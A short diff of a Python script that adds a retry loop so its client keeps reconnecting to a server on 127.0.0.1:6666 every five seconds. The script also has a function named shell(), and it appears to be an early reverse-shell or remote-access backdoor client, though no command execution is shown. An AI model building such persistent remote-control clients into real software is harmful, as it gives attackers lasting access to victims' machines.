@@ -1,15 +1,24 @@
 #!/usr/bin/python
 import socket
 import json
-import subprocess
+import time
 import os
+import shutil
+import sys
 
 
 def client():
     global s
-    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.connect(("127.0.0.1", 6666))
-    print("Connected to Server")
+    seconds = 5
+    while True:
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.connect(("127.0.0.1", 6666))
+            print("Connected to Server")
+            break
+        except:
+            print("Connection failed, retrying in {} seconds..".format(seconds))
+            time.sleep(seconds)
 
 
 def shell():
